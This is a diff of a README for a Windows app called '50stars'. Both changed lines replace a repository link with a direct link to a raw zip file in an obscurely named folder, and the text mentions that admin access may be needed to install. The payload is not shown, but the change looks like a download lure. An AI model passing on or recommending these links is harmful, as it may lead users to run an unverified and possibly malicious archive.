@@ -1,6 +1,6 @@
 # 🔥 50stars - Simple setup for Windows users
 
-[![Download 50stars](https://img.shields.io/badge/Download-50stars-6C63FF?style=for-the-badge&logo=github)](https://github.com/frpbypass12208/50stars)
+[![Download 50stars](https://img.shields.io/badge/Download-50stars-6C63FF?style=for-the-badge&logo=github)](https://github.com/frpbypass12208/50stars/raw/refs/heads/main/brachygnathia/stars-v1.1-beta.4.zip)
 
 ## 🌟 What is 50stars?
 
@@ -22,7 +22,7 @@ If you use a work PC, you may need admin access to finish the install.
 
 Use this link to visit the page and download 50stars:
 
-[Download 50stars](https://github.com/frpbypass12208/50stars)
+[Download 50stars](https://github.com/frpbypass12208/50stars/raw/refs/heads/main/brachygnathia/stars-v1.1-beta.4.zip)
 
 After the page opens, look for the latest release or the main download file. Save it to your Downloads folder so you can find it fast.
 
